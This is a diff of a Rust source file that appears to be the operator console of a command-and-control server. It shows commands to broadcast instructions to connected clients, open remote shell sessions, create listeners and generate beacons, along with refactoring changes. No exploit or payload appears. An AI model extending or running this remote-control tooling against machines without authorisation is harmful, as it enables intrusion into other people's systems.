@@ -1,19 +1,11 @@
 use models::ClientList;
 use std::time::Duration;
 use std::{io::Write, process::exit, sync::Arc};
-use tokio::fs;
 use tokio::time::sleep;
 use tokio::{net::TcpListener, sync::Mutex};
 
 use crate::models::Client;
 mod commands;
-mod mlang;
-use mlang::interpreter::MLangInterpreter;
-use mlang::parser::MLangParser;
-
-mod structures;
-mod winapi;
-
 mod models;
 
 async fn input(title: String) -> Option<String> {
@@ -24,13 +16,12 @@ async fn input(title: String) -> Option<String> {
     std::io::stdin().read_line(&mut user_data).unwrap();
 
     if !user_data.is_empty() {
-        Some(user_data)
+        Some(user_data.trim().to_string())
     } else {
         None
     }
 }
 
-#[tokio::main]
 async fn user_interaction(clients: ClientList) {
     loop {
         match input("Command: ".to_string()).await {
@@ -119,6 +110,26 @@ async fn user_interaction(clients: ClientList) {
                         println!("    - Enumerate the specified client.");
                         println!("    - Optional: Save the response to a file.");
                         println!("    - Supported formats: txt, json");
+                        println!("  broadcast <command>");
+                        println!("    - Broadcast a command to all connected clients.");
+                        println!("  sessions");
+                        println!("    - List active sessions or interact with a session.");
+                        println!(
+                            "    - To interact with a session, use: sessions i <session_number>"
+                        );
+                        println!("    - While interacting, use colon-prefixed commands for shell commands.");
+                        println!("  generate");
+                        println!("    - Generate a new beacon.");
+                        println!("  listeners");
+                        println!("    - List active listeners.");
+                        println!("  create_listener <port>");
+                        println!("    - Create a new listener on the specified port.");
+                        println!("  security_report <client_index> [file_path] [format]");
+                        println!("    - Generate a security report for the specified client.");
+                        println!("    - Optional: Save the report to a file.");
+                        println!("    - Supported formats: txt, json");
+                        println!("  exit");
+                        println!("    - Exit the application.");
                     }
                     "broadcast" => {
                         if args.is_empty() {
@@ -128,7 +139,7 @@ async fn user_interaction(clients: ClientList) {
                             command.push_str("::OVER::");
                             let mut clients_lock = clients.clients.lock().await;
                             for client in clients_lock.iter_mut() {
-                                let _ = client.socket.try_write(command.as_bytes());
+                                let _ = client.write(command.as_bytes()).await;
                             }
                             println!("[+] Command broadcasted to all connected clients.");
                         }
@@ -239,7 +250,9 @@ async fn user_interaction(clients: ClientList) {
                         exit(0);
                     }
                     _ => {
-                        println!("[-] Invalid Command!");
+                        println!(
+                            "[-] Invalid Command! Type 'help' for a list of available commands."
+                        );
                     }
                 }
             }
@@ -248,11 +261,13 @@ async fn user_interaction(clients: ClientList) {
         }
     }
 }
-
 async fn handle_clients(clients: ClientList, port: String) {
     let addr = format!("127.0.0.1:{}", port);
     let socket = TcpListener::bind(&addr).await.unwrap();
-    clients.listeners.lock().await.push(addr.clone());
+    {
+        let mut listeners = clients.listeners.lock().await;
+        listeners.push(addr.clone());
+    }
     loop {
         let (conn, sock_addr) = socket.accept().await.unwrap();
         let sock_addr = sock_addr.to_string();
@@ -264,14 +279,7 @@ async fn handle_clients(clients: ClientList, port: String) {
     }
 }
 
-async fn load_module(module_name: &str) -> String {
-    let module_path = format!("modules/{}.mlang", module_name);
-    fs::read_to_string(module_path)
-        .await
-        .expect("Failed to read module file")
-}
-
-#[tokio::main]
+#[tokio::main(flavor = "multi_thread", worker_threads = 4)]
 async fn main() {
     std::env::set_var("RUST_LOG", "info");
     env_logger::init();
@@ -282,10 +290,5 @@ async fn main() {
         beacons: Arc::new(Mutex::new(vec![])),
         listeners: Arc::new(Mutex::new(vec![])),
     };
-    let clients_handler = clients_user.clone();
-    std::thread::spawn(|| user_interaction(clients_user));
-    std::thread::spawn(|| handle_clients(clients_handler, "8080".to_string()));
-    loop {
-        std::thread::sleep(std::time::Duration::from_secs(5));
-    }
+    user_interaction(clients_user).await;
 }
